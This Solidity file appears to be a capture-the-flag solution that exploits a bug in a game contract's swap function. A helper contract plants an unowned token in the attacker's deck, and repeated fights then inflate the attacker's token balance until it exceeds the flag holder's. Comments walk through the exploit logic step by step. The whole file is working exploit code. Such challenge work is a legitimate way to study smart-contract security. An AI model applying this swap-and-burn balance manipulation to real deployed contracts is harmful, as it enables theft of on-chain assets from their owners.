// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.12;

import {Game} from "./Game.sol";

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "forge-std/console.sol";

contract Slot0Swapper {
    constructor(Game g) {
        g.join();

        /** REPLACE msg.sender's deck slot 0 with a mon they do not own */
        // get our slot 0 and make it swappable
        uint256 id = g.decks(address(this), 0);
        g.putUpForSale(id);
        // there's a bug in `swap` such that both players now have id in slot 0, but caller (this) remains the owner.
        g.swap(msg.sender, id, id);
    }

    // not needed because we do everything in constructor and we never get the callback
    // function onERC721Received(
    //     address operator,
    //     address from,
    //     uint256 tokenId,
    //     bytes calldata data
    // ) external returns (bytes4) {
    //     return IERC721Receiver.onERC721Received.selector;
    // }
}

contract Solution {
    Game private immutable g;

    constructor(Game game) {
        g = game;
    }

    function solve() external {
        address flagHolder = g.flagHolder();
        g.join();

        for (uint256 i = 0; i < 4; ++i) {
            // replace our slot-0 with a mon we are not the owner of
            Slot0Swapper a = new Slot0Swapper(g);
            // when we fight against flagHolder, our slot-0 mon always loses because fighting logic favors flagHolder even in case of draw
            // => it gets burned but SLOT0SWAPPER's balance is reduced because they are the owner but our balance is not reduced
            // => slot 1 and 2 are legitimately burned and our balance is reduced by 2
            // => however, all non-existant IDs are replenished for both fighting parties => we mint 3 new ones and our balance increases by 3
            // => our balance increases by 1 each round
            // need to run this four times so that we win the `balanceOf(attacker) > balanceOf(opponent)` even after we lost all 3 battles
            g.fight();
            console.log("our balance is", g.balanceOf(address(this)));
            console.log("opponent's balance is", g.balanceOf(flagHolder));
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
